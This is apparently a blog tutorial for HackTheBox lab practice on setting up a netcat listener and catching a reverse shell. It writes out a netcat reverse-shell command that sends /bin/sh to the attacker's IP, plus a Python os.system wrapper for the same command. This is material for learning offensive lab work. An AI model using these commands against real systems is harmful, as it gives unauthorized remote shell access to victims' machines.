---
title: "Using a Netcat Listener"
date: 2020-09-24 12:35:00 +0800
categories: [tutorial]
tags: [linux]
toc: true
---

## Introduction

When doing HackTheBox, you're eventually going to need to set up a netcat listener. When you have a listener open on a port, it waits for information to come to that port you are on and establishes a connection to it. This is especially useful when you are able to spawn a shell to a port on the victim machine because you can use netcat to direct the shell to your listener. Here is how you do it.

## Step 1: Start the Listener on your Local Machine

The first thing you need to do is to open the listener on your machine. You will need to pick a high port that is not commonly used. Something in the 4000-9000 range is what I usually go for.

Once you choose your port, simply type the command below:

```
nc -lnvp 9001
```

This will start a listener on your machine on port 9001.

## Step 2: Call to the listener from the victim machine

You will need a few things in order to do this step:
1) The ability to run ``netcat`` with elevated priveledges.
2) The port number that you chose in step 1.
3) Your host machine's IP Address.

Here is the command you would use:

```
nc 10.10.15.76 9001 -e "/bin/sh"
```

Oftentimes, you will use a python script that has escalated privledges in order to call out to your listener. Here is a sample script that can be used:

```
import os

os.system('nc 10.10.15.76 9001 -e "/bin/sh"')
```

In both of these cases, ``10.10.15.76`` is the IP address of my personal machine and ``9001`` is the port I am using.


I find that often you will have to do this step through Python. 


## Step 3: Interact with the Shell

If you did everything correctly, you should now be able to issue commands in the terminal where you typed the command from part 1. Use simple commands such as ``whoami`` or ``ls`` to see who and where you are so that you can keep moving through everything. 

















